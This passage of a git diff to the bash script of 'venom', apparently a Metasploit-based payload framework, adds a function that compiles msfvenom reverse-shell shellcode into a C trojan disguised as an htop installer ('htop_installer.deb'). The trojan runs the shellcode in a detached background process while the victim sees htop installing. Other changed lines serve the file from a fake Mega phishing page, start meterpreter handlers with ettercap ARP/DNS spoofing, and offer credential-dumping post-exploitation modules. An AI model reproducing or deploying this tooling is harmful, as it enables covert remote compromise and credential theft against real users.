             cd $IPATH/
           else
-            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
 
 
@@ -6996,7 +7082,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -7011,7 +7097,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi
         fi
 
@@ -7652,9 +7738,9 @@ fi
           if [ "$MsFlF" = "ON" ]; then
 
             if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
 
            cd $IPATH/output
@@ -7673,9 +7759,9 @@ fi
           else
 
             if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
           fi
 
@@ -7693,9 +7779,9 @@ fi
           if [ "$MsFlF" = "ON" ]; then
 
             if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
 
             cd $IPATH/output
@@ -7714,9 +7800,9 @@ fi
           else
 
             if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
           fi
         fi
@@ -7739,6 +7825,318 @@ else
   echo "[x] Abort module execution .."
   sleep 2
   sh_unix_menu
+  clear
+fi
+}
+
+
+
+
+
+
+
+
+
+
+
+
+#
+# DEBIAN agent (linux systems)
+#
+sh_debian () {
+# get user input to build shellcode
+echo "[☠] Enter shellcode settings!"
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/shell_reverse_tcp" FALSE "linux/x64/meterpreter/reverse_tcp" --width 400 --height 300) > /dev/null 2>&1
+N4m=$(zenity --entry --title "☠ LOGFILE NAME ☠" --text "Enter logfile output name\nexample: logfile" --width 300) > /dev/null 2>&1
+
+echo "[☠] Building shellcode -> C format .."
+sleep 2
+# display final settings to user
+cat << !
+
+    venom settings
+    ╔─────────────────────
+    | LPORT   : $lport
+    | LHOST   : $lhost
+    | FORMAT  : C -> LINUX
+    |_PAYLOAD : $paylo
+
+!
+sleep 1
+# use metasploit to build shellcode (msf encoded)
+echo "[☠] Using msfvenom to build raw shellcode .."
+sleep 2
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c -o $IPATH/output/chars.raw"
+
+
+echo "[☠] Parsing shellcode data .."
+sleep 1
+parse=$(cat $IPATH/output/chars.raw | grep -v "=" | tr -d '";' | tr -d '\n' | tr -d ' ')
+echo ""
+echo "unsigned char buf[] ="
+echo "$parse"
+
+
+
+# ----------------
+# BUILD C PROGRAM
+# ----------------
+cd $IPATH/output
+echo "#include<stdio.h>" > htop.c
+echo "#include<stdlib.h>" >> htop.c
+echo "#include<string.h>" >> htop.c
+echo "#include<sys/types.h>" >> htop.c
+echo "#include<sys/wait.h>" >> htop.c
+echo "#include<unistd.h>" >> htop.c
+echo "" >> htop.c
+echo "/*" >> htop.c
+echo "Author: r00t-3xp10it" >> htop.c
+echo "Framework: venom v1.0.16" >> htop.c
+echo "MITRE ATT&CK T1036 served as Linux RAT agent (trojan)." >> htop.c
+echo "gcc -fno-stack-protector -z execstack htop.c -o htop_installer.deb" >> htop.c
+echo "'Naming the compiled C program to .deb does not call the dpkg at runtime (MITRE ATT&CK T1036)'" >> htop.c
+echo "*/" >> htop.c
+echo "" >> htop.c
+echo "/* msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c */" >> htop.c
+echo "unsigned char voodoo[] = \"$parse\";" >> htop.c
+echo "" >> htop.c
+echo "int main()" >> htop.c
+echo "{" >> htop.c
+echo "   /*" >> htop.c
+echo "   This fork(); function allow us to spawn a new child process (in background). This way i can" >> htop.c
+echo "   execute shellcode in background while continue the execution of the C program in foreground." >> htop.c
+echo "   Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c" >> htop.c
+echo "   */" >> htop.c
+echo "   fflush(NULL);" >> htop.c
+echo "   int pid = fork();" >> htop.c
+echo "      if (pid > 0) {" >> htop.c
+echo "         /*" >> htop.c
+echo "         We are runing in parent process (child its also running)" >> htop.c
+echo "         Install/run htop proccess manager (as foreground job)" >> htop.c
+echo "         */" >> htop.c
+echo "         printf(\"+---------------------------------+\\\n\");" >> htop.c
+echo "         printf(\"|  install Htop proccess manager  |\\\n\");" >> htop.c
+echo "         printf(\"+---------------------------------+\\\n\\\n\");" >> htop.c
+echo "         /* Display system information onscreen to target user */" >> htop.c
+echo "         system(\"h=\$(hostnamectl | grep 'Static' | cut -d ':' -f2);echo \\\"    Hostname :\$h\\\"\");" >> htop.c
+echo "         system(\"c=\$(hostnamectl | grep 'Icon' | cut -d ':' -f2);echo \\\"    Icon     :\$c\\\"\");" >> htop.c
+echo "         system(\"o=\$(hostnamectl | grep 'Operating' | cut -d ':' -f2);echo \\\"    OS       :\$o\\\"\");" >> htop.c
+echo "         system(\"k=\$(hostnamectl | grep 'Kernel' | cut -d ':' -f2);echo \\\"    Kernel   :\$k\\\"\");" >> htop.c
+echo "" >> htop.c
+echo "            /* Install htop package */" >> htop.c
+echo "            sleep(1);printf(\"\\\n[*] Please wait, Installing htop package ..\\\n\");" >> htop.c
+echo "            sleep(1);system(\"sudo apt-get update -qq && sudo apt-get install -y -qq htop\");" >> htop.c
+echo "" >> htop.c
+echo "         /* Execute htop proccess manager */" >> htop.c
+echo "         system(\"f=\$(htop -v | grep -m 1 'htop' | awk {'print \$2'});echo \\\"[i] Htop package version installed: \$f\\\"\");" >> htop.c
+echo "	       sleep(1);printf(\"[*] Please wait, executing htop software ..\\\n\");" >> htop.c
+echo "	       sleep(3);system(\"htop\");" >> htop.c
+echo "      }" >> htop.c
+echo "      else if (pid == 0) {" >> htop.c
+echo "         /*" >> htop.c
+echo "         We are running in child process (as backgrond job - orphan)." >> htop.c
+echo "         setsid(); allow us to detach the child (shellcode) from parent (htop_installer.deb) process," >> htop.c
+echo "         allowing us to continue running the shellcode in ram even if parent process its terminated." >> htop.c
+echo "         */" >> htop.c
+echo "         setsid();" >> htop.c
+echo "         void(*ret)() = (void(*)())voodoo;" >> htop.c
+echo "         ret();" >> htop.c
+echo "      } return 0;" >> htop.c
+echo "}" >> htop.c
+
+
+echo ""
+echo "[☠] Compile C program (MITRE ATT&CK T1036) .."
+sleep 1
+gcc -fno-stack-protector -z execstack $IPATH/output/htop.c -o $IPATH/output/htop_installer.deb
+
+
+sleep 2
+echo "[☠] Give execution permitions to agent .."
+sleep 1
+chmod +x $IPATH/output/htop_installer.deb > /dev/null 2>&1
+
+
+# CHOSE HOW TO DELIVER YOUR PAYLOAD
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/htop_installer.deb\n\nchose how to deliver: htop_installer.deb" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1
+
+
+   if [ "$serv" = "multi-handler (default)" ]; then
+      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
+        if [ "$MsFlF" = "ON" ]; then
+
+          if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+          fi
+
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
+          sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+
+          if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+          fi
+        fi
+      sleep 2
+
+   else
+
+# post-exploitation
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "linux_hostrecon.rc" FALSE "dump_credentials_linux.rc" FALSE "exploit_suggester.rc" --width 305 --height 260) > /dev/null 2>&1
+
+
+if [ "$P0" = "linux_hostrecon.rc" ]; then
+  if [ -e "$pHanTom/post/linux/gather/linux_hostrecon.rb" ]; then
+    echo "[✔] linux_hostrecon.rb -> found"
+    sleep 2
+  else
+    echo "[x] linux_hostrecon.rb -> not found"
+    sleep 1
+    echo "[*] copy post-module to msfdb .."
+    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1
+    echo "[☠] Reloading msfdb database .."
+    sleep 2
+    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+  fi
+fi
+
+
+      # edit files nedded
+      echo "[☠] copy files to webroot..."
+      cd $IPATH/templates/phishing
+      cp $InJEc12 mega[bak].html
+      sed "s|NaM3|htop_installer.deb|g" mega.html > copy.html
+      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
+      cd $IPATH/output
+      cp htop_installer.deb $ApAcHe/htop_installer.deb > /dev/null 2>&1
+      echo "[☠] loading -> Apache2Server!"
+      echo "---"
+      echo "- SEND THE URL GENERATED TO TARGET HOST"
+
+        if [ "$D0M4IN" = "YES" ]; then
+        # copy files nedded by mitm+dns_spoof module
+        sed "s|NaM3|htop_installer.deb|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/htop_installer.deb $ApAcHe/htop_installer.deb
+        echo "- ATTACK VECTOR: http://mega-upload.com"
+        echo "- POST EXPLOIT : $P0"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+          if [ "$MsFlF" = "ON" ]; then
+
+            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            else
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            fi
+
+           cd $IPATH/output
+           # delete utf-8/non-ancii caracters from output
+           tr -cd '\11\12\15\40-\176' < report.log > final.log
+           sed -i "s/\[0m//g" final.log
+           sed -i "s/\[1m\[34m//g" final.log
+           sed -i "s/\[4m//g" final.log
+           sed -i "s/\[K//g" final.log
+           sed -i "s/\[1m\[31m//g" final.log
+           sed -i "s/\[1m\[32m//g" final.log
+           sed -i "s/\[1m\[33m//g" final.log
+           mv final.log $N4m-$lhost.log > /dev/null 2>&1
+           rm report.log > /dev/null 2>&1
+           cd $IPATH/
+          else
+
+            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            else
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            fi
+          fi
+
+
+        else
+
+
+        echo "- ATTACK VECTOR: http://$lhost"
+        echo "- POST EXPLOIT : $P0"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+          if [ "$MsFlF" = "ON" ]; then
+
+            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
+            else
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
+            fi
+
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
+            sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+
+            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
+            else
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
+            fi
+          fi
+        fi
+   fi
+
+
+
+sleep 2
+# CLEANING EVERYTHING UP
+echo "[☠] Cleanning temp generated files..."
+sleep 2
+mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
+rm $ApAcHe/htop_installer.deb > /dev/null 2>&1
+clear
+cd $IPATH/
+sh_menu
+
+else
+
+  echo "[x] Abort module execution .."
+  sleep 2
+  sh_menu
   clear
 fi
 }
@@ -7893,7 +8291,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -7908,7 +8306,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
           rm report.log > /dev/null 2>&1
           cd $IPATH/
           else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
 
 
@@ -7923,7 +8321,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
